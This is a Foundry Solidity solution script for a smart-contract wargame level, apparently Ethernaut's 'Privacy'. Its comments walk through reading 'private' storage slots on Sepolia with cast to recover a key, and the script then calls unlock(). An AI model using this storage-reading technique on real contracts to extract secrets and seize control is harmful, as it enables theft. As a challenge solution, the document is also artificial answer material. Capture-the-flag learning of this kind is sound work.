// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level12Privacy.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

// Objective: Unlock the vault to pass the level!

// to extract the password, we can use the the following steps:
// 1. Run "forge inspect Privacy storageLayout" to find the storage slot for the bytes32[3] private data, which is at slot 3
// ╭--------------+------------+------+--------+-------+--------------------------------╮
// | Name         | Type       | Slot | Offset | Bytes | Contract                       |
// +====================================================================================+
// | locked       | bool       | 0    | 0      | 1     | src/Level12Privacy.sol:Privacy |
// |--------------+------------+------+--------+-------+--------------------------------|
// | ID           | uint256    | 1    | 0      | 32    | src/Level12Privacy.sol:Privacy |
// |--------------+------------+------+--------+-------+--------------------------------|
// | flattening   | uint8      | 2    | 0      | 1     | src/Level12Privacy.sol:Privacy |
// |--------------+------------+------+--------+-------+--------------------------------|
// | denomination | uint8      | 2    | 1      | 1     | src/Level12Privacy.sol:Privacy |
// |--------------+------------+------+--------+-------+--------------------------------|
// | awkwardness  | uint16     | 2    | 2      | 2     | src/Level12Privacy.sol:Privacy |
// |--------------+------------+------+--------+-------+--------------------------------|
// | data         | bytes32[3] | 3    | 0      | 96    | src/Level12Privacy.sol:Privacy |
// ╰--------------+------------+------+--------+-------+--------------------------------╯
// 2. Run "cast storage 0xB607F9343d93da8021975b42f3Be91b8b2846cDD 5 --rpc-url sepolia" to read the 3rd element of data array from the contract's storage
// ---> data[0] = "cast storage 0xB607F9343d93da8021975b42f3Be91b8b2846cDD 3 --rpc-url sepolia"
// ---> data[1] = "cast storage 0xB607F9343d93da8021975b42f3Be91b8b2846cDD 4 --rpc-url sepolia"
// ---> data[2] = "cast storage 0xB607F9343d93da8021975b42f3Be91b8b2846cDD 5 --rpc-url sepolia"
// 3. The 3rd element from data array is "0xdf70cd516a9071bc5dce25c767cbb1d66ac6ab9cd0d8deefb89ff660815e1f44"
// 4. Use the 3rd element in the script to unlock the Privacy contract

contract Level12Solution is Script {
    Privacy public privacy =
        Privacy(0xB607F9343d93da8021975b42f3Be91b8b2846cDD);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Privacy locked:", privacy.locked());
        bytes32 thirdValue = 0xdf70cd516a9071bc5dce25c767cbb1d66ac6ab9cd0d8deefb89ff660815e1f44;
        bytes16 key = bytes16(thirdValue);
        privacy.unlock(key);
        console.log("Privacy locked:", privacy.locked());

        vm.stopBroadcast();
    }
}
// forge script script/Level12Solution.s.sol:Level12Solution --broadcast -vvvv --rpc-url sepolia --etherscan-api-key "${ETHERSCAN_API_KEY}"
